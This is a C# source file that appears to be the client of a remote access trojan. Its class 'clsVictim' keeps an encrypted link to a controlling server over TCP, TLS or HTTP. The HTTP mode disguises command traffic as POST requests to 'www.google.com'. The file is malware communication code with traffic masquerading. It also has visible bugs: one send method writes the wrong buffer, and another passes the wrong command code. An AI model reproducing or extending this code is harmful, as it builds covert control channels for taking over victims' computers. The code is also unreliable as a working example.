using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Net.Security;
using Plugin.Abstractions48;
using System.Runtime.InteropServices.WindowsRuntime;
using System.Windows.Forms;
using System.Threading;

namespace winClient48
{
    public class clsVictim
    {
        public Socket socket { get; set; }
        public SslStream m_sslClnt { get; set; }

        public static int MAX_BUFFER_LENGTH = 65536;
        public byte[] buffer = new byte[MAX_BUFFER_LENGTH];
        public string server_ip;
        public int server_port;

        //CRYPTOGRAPHY
        public (string public_key, string private_key) key_pairs;
        public (byte[] key, byte[] iv) _AES;

        public enProtocol m_protocol { get; set; }

        //Lock
        private readonly SemaphoreSlim _tcpSemaphore = new SemaphoreSlim(1, 1);
        private readonly SemaphoreSlim _sslSemaphore = new SemaphoreSlim(1, 1);

        public clsVictim(Socket socket)
        {
            this.socket = socket;

            m_protocol = enProtocol.TCP;
        }

        public clsVictim(Socket sktClnt, SslStream sslClnt)
        {
            socket = sktClnt;
            m_sslClnt = sslClnt;

            m_protocol = enProtocol.TLS;
        }

        public enum enProtocol
        {
            TCP,
            TLS,
            HTTP,
        }

        public async void Send(int cmd, int param, byte[] msg)
        {
            if (msg == null)
                return;

            byte[] buffer = new clsDSP((byte)cmd, (byte)param, msg).GetBytes();
            if (buffer == null)
                return;

            try
            {
                await _tcpSemaphore.WaitAsync();

                int nOffset = 0;
                while (nOffset < buffer.Length)
                {
                    int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
                    nOffset += nSent;
                }
            }
            finally
            {
                _tcpSemaphore.Release();
            }
        }

        public async void Send(byte[] abBuffer)
        {
            if (abBuffer == null)
                return;

            try
            {
                await _tcpSemaphore.WaitAsync();

                int nOffset = 0;
                while (nOffset < buffer.Length)
                {
                    int nSent = await socket.SendAsync(new ArraySegment<byte>(buffer, nOffset, buffer.Length - nOffset), SocketFlags.None);
                    nOffset += nSent;
                }
            }
            finally
            {
                _tcpSemaphore.Release();
            }
        }

        /// <summary>
        /// Send message string.
        /// </summary>
        /// <param name="cmd">Command code.</param>
        /// <param name="param">Parameter code.</param>
        /// <param name="msg">Message string.</param>
        public void Send(int cmd, int param, string msg)
        {
            Send(cmd, param, Encoding.UTF8.GetBytes(msg));
        }

        /// <summary>
        /// Send message via encrypted channel.
        /// </summary>
        /// <param name="cmd">Command code.</param>
        /// <param name="param">Parameter code.</param>
        /// <param name="data">Data string.</param>
        /// <param name="mode">Message mode.</param>
        public void encSend(int cmd, int param, string data, SendMode mode = SendMode.RAW)
        {
            string enc_data = clsCrypto.AESEncrypt(data, _AES.key, _AES.iv);
            Send(cmd, param, enc_data);
        }

        /// <summary>
        /// Send command string via encrypted channel.
        /// </summary>
        /// <param name="payload"></param>
        /// <param name="mode"></param>
        public void SendCommand(string payload)
        {
            switch (m_protocol)
            {
                case enProtocol.TCP:
                    encSend(2, 0, payload);
                    break;
                case enProtocol.TLS:
                    fnSslSendRAW(Encoding.UTF8.GetBytes(payload));
                    break;
                case enProtocol.HTTP:
                    fnHttpSend(clsCrypto.AESEncrypt(payload, _AES.key, _AES.iv));
                    break;
            }
        }

        public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|'));
        public void fnSendCommand(string[] asMsg) => fnSendCommand(asMsg.ToList());
        public void fnSendCommand(List<string> lsMsg)
        {
            SendCommand(string.Join("|", lsMsg));
        }

        public void fnSslSend(string[] asMsg) => fnSslSend(string.Join("|", asMsg));
        public void fnSslSend(List<string> lsMsg) => fnSslSend(string.Join("|", lsMsg));
        public void fnSslSend(string szMsg) => fnSslSendRAW(Encoding.UTF8.GetBytes(szMsg));

        /// <summary>
        /// SSL send raw data.
        /// </summary>
        /// <param name="abBuffer"></param>
        public async void fnSslSendRAW(byte[] abBuffer) => await fnSslSendRAW(2, 0, abBuffer);

        /// <summary>
        /// SSL send raw data.
        /// </summary>
        /// <param name="nCmd"></param>
        /// <param name="nParam"></param>
        /// <param name="abBuffer"></param>
        /// <returns></returns>
        public async Task fnSslSendRAW(int nCmd, int nParam, byte[] abBuffer)
        {
            byte[] abData = new clsDSP((byte)nCmd, (byte)nParam, abBuffer).GetBytes();

            await _sslSemaphore.WaitAsync();
            try
            {
                await m_sslClnt.WriteAsync(abData, 0, abData.Length);
                //await m_sslClnt.FlushAsync();
                await Task.Yield();
            }
            catch (Exception ex)
            {
                
            }
            finally
            {
                _sslSemaphore.Release();
            }
        }

        /// <summary>
        /// Send HTTP web response.
        /// </summary>
        /// <param name="asMsg"></param>
        public void fnHttpSend(string[] asMsg) => fnHttpSend(asMsg.ToList());
        
        /// <summary>
        /// Send HTTP web response.
        /// </summary>
        /// <param name="lsMsg"></param>
        public void fnHttpSend(List<string> lsMsg) => fnHttpSend(string.Join("|", lsMsg));
        
        /// <summary>
        /// Send HTTP web response.
        /// </summary>
        /// <param name="szMsg"></param>
        public void fnHttpSend(string szMsg) => fnHttpSend(2, 0, szMsg);

        /// <summary>
        /// Send HTTP web response.
        /// </summary>
        /// <param name="nCmd">Command.</param>
        /// <param name="nParam">Parameter</param>
        /// <param name="szMsg">Message, HTTP response body.</param>
        public void fnHttpSend(int nCmd, int nParam, string szMsg)
        {
            clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(szMsg));
            string szBody = Convert.ToBase64String(dsp.GetBytes());

            clsHttpReq req = new clsHttpReq("www.google.com", "/", clsHttpReq.enMethod.POST, "", szBody);
            Send(req.fnabGetRequest());
        }

        public void fnSendCmdParam(int nCmd, int nParam)
        {
            string szMsg = clsEZData.fnGenerateRandomStr();
            byte[] abData = Encoding.UTF8.GetBytes(szMsg);

            switch (m_protocol)
            {
                case enProtocol.TCP:
                    Send(nParam, nParam, abData);
                    break;
                case enProtocol.TLS:
                    fnSslSendRAW(nCmd, nParam, abData);
                    break;
            }
        }
    }
}
